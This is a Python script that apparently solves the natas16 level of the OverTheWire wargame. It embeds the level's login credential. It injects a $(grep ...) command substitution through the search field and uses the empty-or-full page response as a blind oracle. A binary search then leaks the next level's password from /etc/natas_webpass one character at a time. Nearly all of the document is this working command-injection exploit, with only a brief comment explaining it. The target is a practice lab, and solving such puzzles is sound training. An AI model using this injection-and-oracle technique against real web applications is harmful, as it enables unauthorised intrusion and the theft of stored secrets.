import urllib.request, urllib.parse, base64
# natas16: $(...) command substitution survives the filter. The oracle: if the
# grep pattern matches the password prefix, grep outputs only the password line
# (the dictionary words no longer match the whole line) -> the surrounding
# output is empty; otherwise the dictionary dump appears.
url = "http://natas16.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb").decode()
CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
def empty(payload):
    d = urllib.parse.urlencode({"needle": payload}).encode()
    r = urllib.request.Request(url, data=d, headers={"Authorization": auth})
    body = urllib.request.urlopen(r, timeout=30).read().decode("utf-8", "replace")
    i = body.find("<pre>")
    j = body.find("</pre>", i)
    return len(body[i+5:j].strip()) == 0
prefix = ""
for pos in range(1, 40):
    lo, hi = 0, len(CHARS) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if empty(f"$(grep ^{prefix}[{CHARS[lo:mid+1]}] /etc/natas_webpass/natas17)"):
            hi = mid
        else:
            lo = mid + 1
    prefix += CHARS[lo]
    print(prefix, flush=True)
    if len(prefix) == 32:
        break
print("FINAL", prefix)

